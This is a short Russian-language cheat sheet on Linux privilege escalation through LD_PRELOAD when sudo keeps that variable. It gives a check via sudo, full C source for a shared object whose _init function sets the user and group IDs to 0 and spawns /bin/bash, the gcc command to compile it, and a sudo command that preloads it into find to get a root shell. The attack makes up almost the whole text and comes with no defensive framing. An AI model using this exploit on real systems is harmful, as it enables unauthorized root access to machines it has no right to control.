LD_PRELOAD - функция, позволяющая любой программе использовать общую библиотеку.

# Эксплуатация LD_PRELOAD

## Check for LD_PRELOAD (with the env_keep option)
sudo -L
Пример: env_keep += "LD_PRELOAD"


# Пришет код на c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

## Компилируем с нужными параметрами для shared object
gcc -fPIC -shared -o shell.so shell.c -nostartfiles


# Запускаем программу с sudo правами и опцией LD_PRELOAD указывающей на наш .so файл
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find